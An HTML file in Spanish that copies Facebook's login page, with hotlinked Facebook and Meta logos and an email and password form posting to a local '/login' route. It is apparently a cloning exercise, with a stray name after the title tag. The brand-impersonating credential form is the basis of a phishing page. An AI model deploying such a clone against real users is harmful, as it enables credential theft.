<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title> jhon Zambrano 

    
    <link rel="stylesheet" href="style.css">
</head>
<body>
 <a href="#" class="sp">Español</a>
    <div class="container">
        <div class="logo">
            <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
        </div>
        <form action="/login" method="post">
            <div class="form-group">
                <input type="text" id="email" name="email" placeholder="Celular o correo electrónico" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
            </div>
            <button type="submit" class="btn">Iniciar sesión</button>
            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
        </form>
        <div class="create-account">
            <button type="button">Crear cuenta nueva</button>
            </div>
            <div class="meta">
                <p>
                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" alt="Meta Logo">
                </p>
                <a href="#">Información</a>
                <a href="#">Ayuda</a>
                <a href="#">Más</a>
            </div>
        </div>
    </body>
    </html>
